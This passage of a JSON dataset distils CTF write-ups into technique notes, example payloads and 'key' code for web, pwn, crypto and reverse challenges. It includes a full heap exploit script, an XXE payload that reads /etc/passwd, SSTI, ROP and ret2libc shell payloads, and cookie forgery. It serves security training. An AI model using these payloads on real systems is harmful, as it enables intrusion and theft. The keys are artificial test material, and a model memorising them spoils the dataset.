            "When dealing with cookie security mechanisms that involve hashing (possibly including a secret key), and if the chosen hash algorithm is vulnerable to hash length extension attacks (e.g., SHA-1 or MD5), it's possible to forge a valid cookie by extending an existing known valid cookie value. This can be particularly useful in scenarios where the goal is to escalate privileges or impersonate another user. First, the length of the secret key needs to be determined, which can often be done by brute-forcing through different key lengths and observing the server's response to modified cookies. Tools like `hash_extender` can be employed for generating the new hash value after determining the correct key length.\n    - Example of determining key length and crafting payload (not directly executable due to dependencies on specific hash_extender tool and scenario setup):  \n    ```bash\n    #!/bin/bash\n    append=\";user=admin\" # Payload to append\n    key_length_guess=16  # Example guessed key length\n    known_data=\"user=demo\" # Known part of the cookie\n    known_signature=\"9183ff6055a46981f2f71cd36430ed3d9cbf6861\" # Known hash part of the cookie\n    tmp=$(./hash_extender -d=\"$known_data\" --signature=\"$known_signature\" --format=sha1 --append \"$append\" -l $key_length_guess | grep -v Type | grep -v Secret | cut -d\":\" -f 2 | tr \"\\n\" \"|\" | tr -d \" \" | sed 's/||//g')\n    modified_hash=$(echo $tmp | cut -d\"|\" -f 1) # Extracted new hash\n    modified_data=$(echo $tmp | cut -d\"|\" -f 2) # Extracted modified data\n    echo \"New cookie value: $modified_data|$modified_hash\"\n    ```",
            "User enumeration vulnerabilities can provide critical insights during an attack, informing attackers of valid usernames which can be further exploited in various attack vectors, such as crafted cookie/session manipulation or targeted password attacks. By observing different error messages returned by the server (e.g., \"Bad username\" vs. \"Bad password\"), an attacker can deduce the existence of specific usernames within the application. This information can enable focused attacks on specific accounts, especially high-value targets like admin accounts. In scenarios where an application reveals such information, it is advisable for attackers to keep a list of confirmed valid users for use in subsequent exploitation phases, such as the aforementioned cookie forging or direct authentication attacks.\n    - There is no direct payload example for user enumeration as it involves observation and interpretation of error messages returned from the server in response to authentication attempts."
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context\n\nimport hashlib\nimport hmac\n\nSECRET_KEY = b'supersecretkey'\n\ndef generate_session_cookie(user):\n    user_data = f\"user={user}\".encode()\n    mac = hmac.new(SECRET_KEY, user_data, hashlib.sha1).hexdigest()\n    return f\"{user_data.hex()}|{mac}\"\n\ndef verify_session_cookie(cookie):\n    user_data_hex, mac = cookie.split('|')\n    user_data = bytes.fromhex(user_data_hex)\n    expected_mac = hmac.new(SECRET_KEY, user_data, hashlib.sha1).hexdigest()\n    return hmac.compare_digest(mac, expected_mac)\n\n# Example usage\ncookie = generate_session_cookie('demo')\nprint(\"Generated cookie:\", cookie)\nprint(\"Is cookie valid?\", verify_session_cookie(cookie))\n```\n"
    },
    {
        "name": "Weapon",
        "write_up": "dataset/raw/Weapon.md",
        "type": "pwn",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 219,
        "max_score": 952,
        "difficulty": 0.23004201680672268,
        "knowledge": [
            "In heap exploitation challenges where the goal is to perform a fastbin attack to gain shell or leak libc addresses, creating and freeing chunks in a specific order can manipulate the fastbin list to achieve arbitrary write or control over function pointers. This involves creating a fake chunk, freeing it to place it in the fastbin list, and then overwriting the metadata of another free chunk to control the fd pointer to point to a target memory location (such as `__malloc_hook`, `__free_hook`, or a GOT entry). \n   \n   Exploit steps for fastbin attack:\n   - Create several chunks of memory.\n   - Free some of them to populate the fastbin list.\n   - Craft a chunk with a specific size and content to overwrite another chunk's metadata or to manipulate the fastbin list.\n   - Free and reallocate chunks to control the allocation and placement of chunks in memory, allowing the execution of arbitrary code or memory leak.\n\n   Example payload snippet for manipulating fastbin list and creating fake chunk:\n   ```\n   add(0x60,2,p64(0x0)+p64(0x21)+'\\x00'*0x18+p64(0x21)*5)  # Creating fake chunk\n   free(2)  # Freeing to manipulate fastbin\n   add(0x60,0,'\\xdd\\x25')  # Manipulating fastbin list\n   ```",
            "Leveraging oversized input to trigger unexpected allocations in heap exploitation challenges can lead to controlled memory layouts or leaking libc addresses. When a program uses functions like `scanf` to read user input and allocates memory to store this input if the input size exceeds a certain threshold, an attacker can force the program to allocate a large chunk (e.g., 0x400) that might interfere with the existing heap layout, facilitating heap consolidation attacks or making libc addresses available for leakage through controlled content or structure overwrites.\n   \n   Exploit steps to trigger unexpected allocations and manipulate heap:\n   - Use program functionalities to create chunks in the heap.\n   - Trigger an unexpected allocation by inputting an oversized payload.\n   - Take advantage of the modified heap layout to create or edit chunks that either overwrite libc pointers or other sensitive data structures.\n\n   Example payload snippet for triggering unexpected allocation and subsequent exploitation:\n   ```\n   p.recvuntil(\">> \")  \n   p.sendline(\"1\"*0x1000)  # Triggering unexpected allocation by oversized input\n   create(3,0x60,\"\\xdd\\x25\")  # Creating controlled chunk after oversized allocation\n   ```"
        ],
        "key": "```python\ndef add(size,idx,name=\"padding\"):  \n    cmd(1)  \n    p.sendlineafter(\": \",str(size))  \n    p.sendlineafter(\": \",str(idx))  \n    p.sendafter(\":\\n\",name)  \n\ndef free(idx):  \n    cmd(2)  \n    p.sendlineafter(\":\",str(idx))  \n\ndef edit(idx,name):  \n    cmd(3)  \n    p.sendlineafter(\": \",str(idx))  \n    p.sendafter(\":\\n\",name)  \n\nadd(0x18,0)  \nadd(0x18,1)  \nadd(0x60,2,p64(0x0)+p64(0x21)+'\\x00'*0x18+p64(0x21)*5)  \nadd(0x60,3,p64(0x21)*12)  \nadd(0x60,4)  \nadd(0x60,5)  \nfree(0)  \nfree(1)  \nfree(0)  \nfree(1)\n\nadd(0x18,0,\"\\x50\")  \nadd(0x18,0,'\\x00'*8)  \nadd(0x18,0,\"A\")\n\nadd(0x18,0,'GET')\n\nedit(2,p64(0x0)+p64(0x91))  \nfree(0)\n\nadd(0x18,0)  \nadd(0x60,0,'\\xdd\\x25')\n\nfree(2)  \nfree(5)  \nfree(2)  \nfree(5)\n\nadd(0x60,4,'\\x70')  \nadd(0x60,0)  \nadd(0x60,0)  \nadd(0x60,0)  \nadd(0x60,0,'\\x00'*(0x40+3-0x10)+p64(0x1800)+'\\x00'*0x19)  \np.read(0x40)\n\nbase=u64(p.read(6).ljust(8,'\\x00'))-(0x7ffff7dd2600-0x7ffff7a0d000)  \nlog.warning(hex(base))  \nlibc=ELF(\"./pwn\").libc  \nAdd(0x60,0)  \nAdd(0x60,1)  \nAdd(0x18,2)  \nFree(0)  \nFree(1)  \nFree(0)  \nAdd(0x60,0,p64(libc.sym['__malloc_hook']+base-35))  \nAdd(0x60,0)  \nAdd(0x60,0)  \none=0xf02a4  \nAdd(0x60,0,'\\x00'*19+p64(one+base))\n\nFree(1)  \nFree(1)\n```"
    },
    {
        "name": "Webcome!",
        "write_up": "dataset/raw/Webcome!.md",
        "type": "web",
        "competition": [
            "ASIS/2021/Finals",
            "https://ctftime.org/event/1416/tasks/"
        ],
        "score": 314,
        "max_score": 953,
        "difficulty": 0.32948583420776495,
        "knowledge": [
            "To bypass script sanitization where certain characters or sequences are filtered, attackers can escape out of the initial context by ending the sequence prematurely with characters like `\\\\';` and then commenting out the rest of the line with `//` at the end to avoid syntax errors. This technique allows embedding malicious scripts or payloads within parameters that are inserted into the code or HTML. Example payload snippet: `\\\\';[payload]//`",
            "When dealing with CAPTCHA protected routes, one strategy is to solve the CAPTCHA externally and then use the obtained `g-recaptcha-response` to programmatically submit requests to the protected route. This method assumes the backend service lacks checks for origin or additional session validation tied to the CAPTCHA solving process, allowing an attacker to reuse a valid `g-recaptcha-response` in a crafted payload. This could be particularly effective when coupled with an XSS vulnerability or server-side request forgery (SSRF) to automate the process of obtaining sensitive information or triggering specific actions on the backend. Example payload step:\n   - Fetch `g-recaptcha-response` from an external source or service where CAPTCHA was solved.\n   - Create a POST request with the obtained `g-recaptcha-response` to the protected route.\n   - Extract sensitive information or flag from response and forward it to an attacker-controlled endpoint."
        ],
        "key": "```javascript  \napp.get('/',(req,res)=>{  \n\tvar msg = req.query.msg  \n\tif(!msg) msg = `Yo you want the flag? solve the captcha and click submit.\\\\nbtw you can't have the flag if you don't have the secret cookie!`  \n\tmsg = msg.toString().toLowerCase().replace(/\\'/g,'\\\\\\'').replace('/script','\\\\/script')  \n\tres.send(indexHtml.replace('$MSG$',msg))  \n})  \n```"
    },
    {
        "name": "WebFugu",
        "write_up": "dataset/raw/WebFugu.md",
        "type": "web",
        "competition": [
            "SharkyCTF/2020",
            "https://ctftime.org/event/1034/tasks/"
        ],
        "score": 291,
        "max_score": 600,
        "difficulty": 0.485,
        "knowledge": [
            "When encountering encoded strings in web-based challenges, a two-step decoding process involving URL decoding followed by Base64 decoding can reveal hidden server-side template code or data structures. This knowledge is particularly useful in challenges where data is obfuscated or encoded to hide vulnerabilities or sensitive information.",
            "In scenarios dealing with server-side template injection vulnerabilities, specifically in web applications using the Thymeleaf template engine, injecting expressions to explore available variables (`${#vars.getVariableNames()}`) or invoking methods (`${flag.getContent()}`) can lead to the exposure of sensitive information or the execution of server-side code. This tactic can be applied to various template engines with similar syntax for variable access and method invocation. \n   \n   Example payload to list all variable names and their values:\n   ```\n   <div>  \n      <table border=\"1\">  \n         <tr th:each =\"var : ${#vars.getVariableNames()}\">  \n            <td th:utext=\"${var}\"></td>  \n            <td th:utext=\"${#vars.getVariable(var)}\"></td>  \n         </tr>  \n     </table>  \n   </div>\n   ```"
        ],
        "key": "```html\n<div>  \n   <table border=\"1\">  \n     <tr>  \n        <th>Name</th>  \n        <th>Discovery year</th>  \n        <th>Discoverer name</th>  \n     </tr>  \n     <tr th:each =\"fish : ${fishes}\">  \n        <td th:utext=\"${fish.name}\">...</td>  \n        <td th:utext=\"${fish.discoveryYear}\">...</td>  \n        <td th:utext=\"${fish.discovererName}\">...</td>  \n     </tr>  \n   </table>  \n</div>\n```"
    },
    {
        "name": "web_Alex Fan Club API",
        "write_up": "dataset/raw/web_Alex Fan Club API.md",
        "type": "web",
        "competition": [
            "LIT/2021",
            "https://ctftime.org/event/1398/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with a web challenge that involves inputting XML data, be mindful of XML External Entity (XXE) vulnerabilities. Specifically, if the application uses the `fromstring` function to parse XML without proper sanitization or security checks in place, it might be vulnerable to XXE attacks. This vulnerability can be exploited by crafting a malicious XML payload that defines an external entity containing data that you want the server to process, which can lead to unauthorized access to sensitive data.  \n   Example payload for XXE:  \n   ```\n   <?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><req><search>&xxe;</search></req>\n   ```",
            "If external network interactions are blocked (a common security measure to prevent certain types of XXE attacks), you can exploit the application logic to exfiltrate data. For instance, by using server feedback or error messages in response to crafted inputs, you can perform operations like a binary search to deduce or infer the value of sensitive data such as a flag. This approach is particularly useful in scenarios where direct data retrieval is not possible due to security restrictions.  \n   To apply this, you might insert specific inputs or commands within your XML payload that could cause the application to return a different response based on the processed data, thus allowing you to gradually narrow down to the correct value through feedback analysis or error messages.  \n   (A specific payload for this method cannot be provided without more context on the application's handling of XML input and the feedback it provides.)"
        ],
        "key": "```python\nfrom lxml import etree\n\ndef process_request(xml_data):\n    # Parse the XML data\n    root = etree.fromstring(xml_data)\n    \n    # Extract sendtime and nowtime\n    sendtime = int(root.find('stime').text)\n    nowtime = int(root.find('ntime').text)\n    \n    # Compare sendtime and nowtime\n    if sendtime < nowtime:\n        return \"Request is valid\"\n    else:\n        return \"Request is invalid\"\n\n# Example XML data\nxml_data = \"\"\"\n<!DOCTYPE req [\n<!ELEMENT req (stime, ntime, search)>\n<!ELEMENT stime (#PCDATA)>\n<!ELEMENT ntime (#PCDATA)>\n<!ELEMENT search (#PCDATA)>\n]>\n<req>\n    <stime>1234567890</stime>\n    <ntime>0987654321</ntime>\n    <search>cool</search>\n</req>\n\"\"\"\n\n# Process the request\nresponse = process_request(xml_data)\nprint(response)\n```"
    },
    {
        "name": "web_LIT BUGS",
        "write_up": "dataset/raw/web_LIT BUGS.md",
        "type": "web",
        "competition": [
            "LIT/2021",
            "https://ctftime.org/event/1398/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with web applications that utilize WebSockets for key functionalities such as user registration and login processes, analyzing the WebSocket event handlers in the source code can reveal potential vulnerabilities. Specifically, if the source code indicates predictable or enumerate-able unique identifiers (IDs) are tied to sensitive functionalities or data access, these can likely be brute-forced to bypass security measures or access restricted data.",
            "In scenarios where an application assigns random but enumerable IDs for user identification, and there's an exposed endpoint or functionality allowing data retrieval based on those IDs without proper rate limiting or authentication, a brute force attack can be effectively employed to enumerate all possible IDs and extract sensitive data. The knowledge of JavaScript and the ability to write scripts that interact with WebSockets can be particularly useful in automating the brute force process directly within the browser's console. \n\nExample Payload:\n```javascript\nsocket.on(\"reqNameRes\",(name)=>{  \n\tconsole.log(name)  \n});  \nfor(var i = 0; i < 1000; i++){  \n\tsocket.emit(\"reqName\", i)  \n}\n```"
        ],
        "key": "```javascript\nio.on('connection',(socket) => {  \n    socket.on('login',(tn,pwd) => {  \n        if(accounts[tn] == undefined || accounts[tn][\"password\"] != md5(pwd)) {  \n            socket.emit(\"loginRes\",false,-3);  \n            return;  \n        }  \n        socket.emit(\"loginRes\",true,accounts[tn][\"rand_id\"]);  \n        return;  \n    });\n\n    socket.on('reqName',(rand_id) => {  \n        name = id2Name[parseInt(rand_id)];  \n        socket.emit(\"reqNameRes\",name);  \n    });\n\n    socket.on('register',(tn,pwd) => {  \n        if(accounts[tn] != undefined) {  \n            socket.emit(\"regRes\",false,-1);  \n            return;  \n        }  \n        if(Object.keys(accounts).length >= 500) {  \n            socket.emit(\"regRes\",false,-2);  \n            return;  \n        }  \n        var rand_id = Math.floor(Math.random() * 1000);  \n        while(id2Name[rand_id] != undefined) {  \n            rand_id = Math.floor(Math.random() * 1000);  \n        }  \n        accounts[tn] = {  \n            \"password\": md5(pwd),  \n            \"rand_id\": rand_id  \n        };  \n        id2Name[rand_id] = tn;  \n        socket.emit(\"regRes\",true,rand_id);  \n    });  \n});\n```"
    },
    {
        "name": "web_Secure Website",
        "write_up": "dataset/raw/web_Secure Website.md",
        "type": "web",
        "competition": [
            "LIT/2022",
            "https://ctftime.org/event/1694/tasks/"
        ],
        "score": -1.0,
        "max_score": 445,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving an RSA encryption and decryption mechanism on the client and server-side respectively, timing attacks can be facilitated by exploiting inefficient implementation of cryptographic functions such as `modPow`. This is applicable in scenarios where the cryptographic function takes significantly longer to process decryption of incorrect inputs compared to correct ones, leading to measurable time differences. A potential increase in response time indicates that the erroneous function call (e.g., decryptRSA) is being executed, signifying a correct password character. This knowledge is crucial for designing exploits that rely on differential timings to extract information bit by bit.",
            "To accurately execute a timing attack where the exact length of the secret or password is crucial but unknown, a progressively increasing input length method can be employed. By submitting inputs of varying lengths and measuring the server's response time, attackers can pinpoint the correct length when a notable change in response time is observed. This strategy is particularly effective in environments where early checks compare input length to secret length, and only inputs matching the secret length in terms of size proceed to more time-consuming operations (e.g., decryption operations in the RSA context provided). This approach allows for the circumvention of length checks and facilitates a more focused and efficient timing attack to deduce the password character by character.\n\nSample payload to find password length:\n```python\nimport requests, time\ndef find_length(url):\n    for i in range(1, 31):  # Assuming maximum password length to be 30\n        payload = url + \"verify?password=\" + (\"1234567890,\" * i)[:-1]\n        start_time = time.time()\n        requests.get(payload, allow_redirects=False)\n        elapsed_time = time.time() - start_time\n        print(f\"Length {i}: {elapsed_time} seconds\")\n```"
        ],
        "key": "```js  \napp.get('/verify', (req, res) => {  \n\tvar pass = req.query.password;  \n\tvar start = performance.now();  \n  \n\tif(pass == undefined || typeof(pass) !== 'string' || !checkPassword(password,pass)) {  \n\t\tres.writeHead(302, {'Location': 'about:blank'});  \n\t\tvar now = performance.now();  \n\t\t// console.log(now - start);  \n\t\tres.end();  \n\t\treturn;  \n\t}  \n\tres.render(\"secret\",{flag: flag});  \n});  \n// passwordChecker.js  \nvar p = 3217;  \nvar q = 6451;  \nvar e = 17;  \n// Hmmm, RSA calculator says to set these values  \nvar N = p * q;  \nvar phi = (p - 1) * (q - 1);  \nvar d = 4880753;\n\nfunction decryptRSA(num) {  \n\treturn modPow(num,d,N);  \n}\n\nfunction checkPassword(password,pass) {  \n\tvar arr = pass.split(\",\");  \n\tfor(var i = 0;i < arr.length;++i) {  \n\t\tarr[i] = parseInt(arr[i]);  \n\t}  \n\tif(arr.length != password.length) return false;\n\n\tfor(var i = 0;i < arr.length;++i) {  \n\t\tvar currentChar = password.charCodeAt(i);  \n\t\tvar currentInput = decryptRSA(arr[i]);  \n\t\tif(currentChar != currentInput) return false;  \n\t}  \n\treturn true;  \n}\n\nfunction modPow(base,exp,mod) {  \n\tvar result = 1;  \n\tfor(var i = 0;i < exp;++i) {  \n\t\tresult = (result * base) % mod;  \n\t}  \n\treturn result;  \n}  \n```"
    },
    {
        "name": "weenie_hut_general",
        "write_up": "dataset/raw/weenie_hut_general.md",
        "type": "reverse",
        "competition": [
            "b01lers/2021",
            "https://ctftime.org/event/1259/tasks/"
        ],
        "score": 218,
        "max_score": 500,
        "difficulty": 0.436,
        "knowledge": [
            "When analyzing binary challenges that include random number generation, if a static seed is used with functions like `srand()`, the sequence of numbers generated by subsequent calls to `rand()` can be predicted and replicated. This allows for reverse-engineering the logic or values expected by the binary, especially if the binary's behavior depends on this predictable sequence. To leverage this, recreate the random sequence generation logic in a separate program, using the same seed, to predict or understand the expected values. This approach can be fundamental in solving challenges that rely on deterministic outputs from pseudo-random functions.\n\n    Example in pseudo-code based on the challenge:\n    ```c\n    srand(static_seed);\n    predictable_number = rand();\n    ```",
            "For reverse-engineering challenges where the goal is to calculate or deduce a specific input (`param_1` in this case) that leads to a desired outcome (e.g., authentication bypass, flag disclosure), analyze the conditions involving this input in the disassembled or decompiled code. Then, replicate the logic in a custom script or program, manipulating the equation if necessary, to solve for the unknown input. This method is particularly effective for challenges where the input is processed in a predictable or reversible manner.\n\n    Example approach derived from the challenge:\n    ```c\n    // Given: uVar1, uVar2, and a target XOR value (0x3597b741)\n    // Solve for x (the original input param_1)\n    x = uVar2 ^ uVar1 ^ 0x3597b741;\n    ```"
        ],
        "key": "```c\nvoid revvy(void)  \n{  \n srand(0x11c4);  \n return;  \n}\n\nvoid tryToRev(uint param_1)  \n{  \n uint uVar1;  \n uint uVar2;  \n  \n revvy();  \n uVar1 = rand();  \n uVar2 = rand();  \n if ((param_1 ^ uVar1 ^ 0x3597b741) == uVar2) {  \n   puts(  \n       \"Password Accepted, welcome to weenie hut general! Submit input as flag! (Don\\'t forget towrap it in bctf{})\"  \n       );  \n }  \n else {  \n   puts(\"That\\'s incorrect. Try going to weenie hut junior.\");  \n }  \n return;  \n}  \n```"
    },
    {
        "name": "WEIRD ENCRYPTION",
        "write_up": "dataset/raw/WEIRD ENCRYPTION.md",
        "type": "crypto",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 377,
        "max_score": 499,
        "difficulty": 0.7555110220440882,
        "knowledge": [
            "In challenges involving custom encryption methods where ciphertext characters correspond to values derived from their positions within a specific string or array (denoted here as `main_string`), one can decrypt the message by reversing the process. This involves determining the original indexes used in the encryption process, then applying arithmetic operations to convert these indexes back to ASCII values, thus revealing the plaintext. This method is applicable whenever the encryption involves simple mathematical operations based on index values within a predefined string or array.\n\nExample payload/template (adjusted based on the specifics of the challenge):\n```python\nwith open(\"Encrypted_File_Path\", \"r\") as file:  \n    ciphertext = file.read().replace(\"\\n\", \"\")\n\nmain_string=\"predefined_string_or_array_used_in_encryption\".split()\nascii_values = []  \nplaintext_chars = []  \n\n# Convert ciphertext into index values or a similar intermediary format\n# Note: The conversion logic will vary based on the encryption details\nfor char in ciphertext:\n    # Assuming a simplified example where each char directly maps to an index\n    index = main_string.index(char)  \n    ascii_values.append(index)\n\n# Convert intermediary format (e.g., index values) back to ASCII values then to characters\nfor index in ascii_values:\n    # Assuming a simple arithmetic relationship for demonstration\n    ascii_value = some_arithmetic_operation(index)  \n    plaintext_chars.append(chr(ascii_value))  \n\nplaintext = ''.join(plaintext_chars)\nprint(plaintext)\n```",
            "When the encryption method uses a divisor and operates by dividing ASCII values into quotient and remainder pairs, the decryption process can effectively reverse this by multiplying each quotient by the divisor and adding the remainder to reconstruct each character's ASCII value. This strategy is effective in scenarios where encryption algorithms break down ASCII representations of characters into smaller, arithmetic components (e.g., quotient and remainder from division) before encoding them.\n\nExample payload/template for decryption:\n```python\n# Assuming divisor, quotients, and remainders are already defined or extracted\ndivisor = 16  # This value could change based on the encryption specifics\ndecrypted_chars = []\n\nfor i in range(0, len(encoded_indexes), 2):  # encoded_indexes stores quotient and remainder pairs\n    ascii_val = divisor * encoded_indexes[i] + encoded_indexes[i+1]\n    decrypted_chars.append(chr(ascii_val))\n\ndecrypted_text = ''.join(decrypted_chars)\nprint(decrypted_text)\n```"
        ],
        "key": "```python\n#!/bin/env python3\n\nwith open(\"Encrypted\", \"r\") as f:  \n\tct = f.read().replace(\"\\n\", \"\")\n\nmain_string=\"c an u br ea k th is we ir d en cr yp ti on\".split()\n\nst = []  \nflag = []  \nch = \"\"  \ni = 0\n\n# To make a list st containing index of characters from main_string  \nwhile i<len(ct):\n\n\tif (ct[i]=='c' and ct[i+1]!='r') or ct[i]=='u' or ct[i]=='k' or ct[i]=='d':  \n\t\tch = main_string.index(ct[i])  \n\t\ti += 1  \n\telse:  \n\t\tch = main_string.index(ct[i:i+2])  \n\t\ti += 2  \n\tst.append(ch)\n\n# Calculating ASCII values and converting into character  \nfor i in range(0,len(st),2):  \n\tflag.append(chr(16*st[i]+st[i+1]))  \nprint(''.join(flag))  \n```"
    },
    {
        "name": "Weird Message",
        "write_up": "dataset/raw/Weird Message.md",
        "type": "crypto",
        "competition": [
            "angstrom/2018",
            "https://ctftime.org/event/577/tasks/"
        ],
        "score": 100,
        "max_score": 250,
        "difficulty": 0.4,
        "knowledge": [
            "When dealing with punycode encoded data in a CTF challenge, one method to decode is to first attempt decoding using the 'punycode' codec. If homoglyphs (characters that look similar to ASCII characters but have different unicode values) are present, they should be identified and replaced with their ASCII equivalents before final decoding. This approach is effective in challenges where visual deception is used to disguise data. For example, a mapping can be created to replace the homoglyphs '\u042c\u0430\u0435\u043e\u0440\u0441\u0443\u0445\u0455\u0456\u0458\u0461\u0475\u04bb' with their ASCII lookalikes 'baeopcyxsijwvh'.",
            "If a long and complex string is provided in a cryptographic challenge, and standard decoding methods return data containing non-ASCII characters or hints towards specific encoding schemes (like punycode), consider the presence of encoded messages that require iterative decoding. This means repeatedly decoding the data until a readable format is achieved or until all encoding layers (indicated by specific delimiters or character patterns such as '-') are removed. This method applies in scenarios where data is heavily obscured through multiple layers of encoding or representation changes."
        ],
        "key": "```python\nrepl = {a: b for a, b in zip(  \n   '\u042c\u0430\u0435\u043e\u0440\u0441\u0443\u0445\u0455\u0456\u0458\u0461\u0475\u04bb',  \n   'baeopcyxsijwvh')}\n\ntry:  \n   unreplaced = set()  \n   while b'-' in data:  \n       data = data.decode('punycode')  \n       for char in data:  \n           if ord(char) > 0x80:  \n               unreplaced.add(char)  \n       for a, b in repl.items():  \n           data = data.replace(a, b)  \n       data = bytearray(data, 'ascii')  \nfinally:  \n   print(''.join(sorted(unreplaced)))  \n   print(data)  \n```"
    },
    {
        "name": "weird-rop",
        "write_up": "dataset/raw/weird-rop.md",
        "type": "reverse",
        "competition": [
            "CircleCityCon/2021",
            "https://ctftime.org/event/1350/tasks/"
        ],
        "score": 278,
        "max_score": 299,
        "difficulty": 0.9297658862876255,
        "knowledge": [
            "In challenges involving Return Oriented Programming (ROP), especially when dealing with limited or \"yucky\" gadgets that do not directly suit the needs of manipulation or system call invocation, XOR gadgets can be repurposed to set specific register values. This technique can be particularly useful when needed to adjust register values to perform system calls indirectly by manipulating the register's value through XOR operations with immediate values. This action requires computing or brute-forcing the sequence of XOR operations to achieve the desired register state. For exploitation, one might write a script to automate the search for the correct combination of XOR gadgets to set a specific register to the required value.\n\n    - Condition: When direct gadgets are unavailable or insufficient to achieve a desired register state for syscall arguments.\n    - Knowledge: Use XOR gadgets in combination by brute-forcing or calculating the necessary immediate values to XOR with, achieving a required value in a register. This method compensates for the absence of direct gadgets to set register values.",
            "When exploiting buffer overflows or similar vulnerabilities in statically compiled binaries, it is crucial to create a ROP chain that interacts with system calls directly due to the absence of libc. For reading and writing operations, understanding the ABI (Application Binary Interface) and syscall numbers for `read` and `write` operations provides the ability to manipulate file descriptors and buffer addresses to read a file (like a flag file) and write its contents to standard output. Additionally, knowing how file descriptors are represented and manipulated in a program lets attackers craft precise ROP chains to leak information or redirect output.\n\n    - Condition: Applicable in scenarios involving buffer overflows in statically compiled binaries where direct system call invocation is needed.\n    - Knowledge: Construct a ROP chain using direct system call invocations with appropriate syscall numbers and manipulate file descriptors along with buffer addresses to perform read/write operations without relying on libc functions.\n\n```C\nuint8_t exploit[EXPLOIT_LEN] = {\n    // [Filler bytes adjusted for stack alignment and buffer offset]\n    // XOR gadgets to manipulate 'rdi' for file descriptor\n    0x7c, 0x10, 0x40, 0x00, // xor rdi, 0x53; Address adjusted for example\n    0x1a, 0x10, 0x40, 0x00, // xor rdi, 0x56; Address adjusted for example\n    // Gadget to set 'rdx' register for length of read/write\n    0xde, 0x10, 0x40, 0x00, // pop rdx; Address adjusted for example\n    0x19, 0x00, 0x00, 0x00, // [Value for 'rdx']\n    // System call gadgets for read and write operations\n    0x02, 0x10, 0x40, 0x00, // mov rax, 0x0 (syscall number for read)\n    0xdb, 0x10, 0x40, 0x00, // syscall\n    0x0a, 0x10, 0x40, 0x00, // mov rax, 0x1 (syscall number for write)\n    0x12, 0x10, 0x40, 0x00, // mov rdi, 0x1 (stdout file descriptor)\n    0xdb, 0x10, 0x40, 0x00, // syscall\n};\n```"
        ],
        "key": "```asm  \n\u2502           0x004010e0      55             push rbp  \n\u2502           0x004010e1      4889e5         mov rbp, rsp  \n\u2502           0x004010e4      4883ec10       sub rsp, 0x10  \n\u2502           0x004010e8      48c7c0020000.  mov rax, 2  \n\u2502           0x004010ef      488d3c250020.  lea rdi, loc.flag ; 0x402000 ;\n\"/flag.txt\"  \n\u2502           0x004010f7      48c7c6020000.  mov rsi, 2  \n\u2502           0x004010fe      48c7c2000000.  mov rdx, 0  \n\u2502           0x00401105      0f05           syscall  \n\u2502           0x00401107      4883c030       add rax, 0x30  \n\u2502           0x0040110b      880424         mov byte [rsp], al  \n\u2502           0x0040110e      c64424010a     mov byte [var_1h], 0xa  \n\u2502           0x00401113      48c7c0010000.  mov rax, 1  \n\u2502           0x0040111a      48c7c7010000.  mov rdi, 1  \n\u2502           0x00401121      4889e6         mov rsi, rsp  \n\u2502           0x00401124      48c7c2020000.  mov rdx, 2  \n\u2502           0x0040112b      0f05           syscall  \n\u2502           0x0040112d      48c7c0000000.  mov rax, 0  \n\u2502           0x00401134      48c7c7000000.  mov rdi, 0  \n\u2502           0x0040113b      4889e6         mov rsi, rsp  \n\u2502           0x0040113e      48c7c2c80000.  mov rdx, 0xc8  \n\u2502           0x00401145      0f05           syscall  \n\u2502           0x00401147      48c7c7000000.  mov rdi, 0  \n\u2502           0x0040114e      4883c410       add rsp, 0x10  \n\u2502           0x00401152      5d             pop rbp  \n\u2514           0x00401153      c3             ret  \n```"
    },
    {
        "name": "Welcome Pwner",
        "write_up": "dataset/raw/Welcome Pwner.md",
        "type": "pwn",
        "competition": [
            "FwordCTF/2020",
            "https://ctftime.org/event/1066/tasks/"
        ],
        "score": 374,
        "max_score": 500,
        "difficulty": 0.748,
        "knowledge": [
            "When dealing with a Buffer Overflow (BOF) vulnerability on systems with protections like NX and PIE enabled but lacking a stack canary, a Return-Oriented Programming (ROP) approach can be utilized to execute arbitrary code. This is facilitated by the leakage of a system function's address, which when combined with the right version of libc, allows for the determination of the base address of libc in memory. This base address can be used to calculate the addresses of other libc functions and gadgets needed for ROP chains.\n   \n   Example scenario: If a program leaks the address of the `system` function and the input is received via an insecure function like `gets`, which does not check the bounds of the input buffer, this setup can be exploited by first finding the correct libc version using tools like the libc-database. With the correct libc version, calculating the offset to the `system` function allows for crafting a payload that includes the `system` function's address to execute `/bin/sh`, granting shell access.",
            "When the libc version is not known a priori in a remote exploitation scenario, the libc-database can be employed to identify the version of libc used by the remote system. This is achieved by leaking an address of a libc function (e.g., `system`) and searching for the last few nibbles of this address using the `./find` command provided by the libc-database. Once the libc version is identified, the associated libc binary can be downloaded and used locally to calculate offsets for ROP chains accurately.\n\n   Example scenario: To exploit a remote service that leaks the address of `system`, connect to the service to get the leaked address. Use the address with libc-database's `./find` utility, narrowing the search with architecture specifics (e.g., i386). Once the correct libc version is identified and downloaded, calculate the base address of libc from the leaked `system` address to craft a ROP chain or to call `system(\"/bin/sh\")` for shell access.\n\n   Sample of payload construction with Python's `pwntools`:\n   ```python\n   payload  = 0x20 * b'A'\n   payload += p32(libc.sym.system)\n   payload += 4 * b'B'\n   payload += p32(libc.search(b'/bin/sh').__next__())\n   ```"
        ],
        "key": "```c\nundefined4 vuln(void)  \n{  \n char local_20 [24];  \n  \n printf(\"%x\\n\",system);  \n puts(\"Input : \");  \n gets(local_20);  \n return 0;  \n}  \n```"
    },
    {
        "name": "Welcome To Pwn",
        "write_up": "dataset/raw/Welcome To Pwn.md",
        "type": "pwn",
        "competition": [
            "boot2root/2020",
            "https://ctftime.org/event/1202/tasks/"
        ],
        "score": 457,
        "max_score": 496,
        "difficulty": 0.9213709677419355,
        "knowledge": [
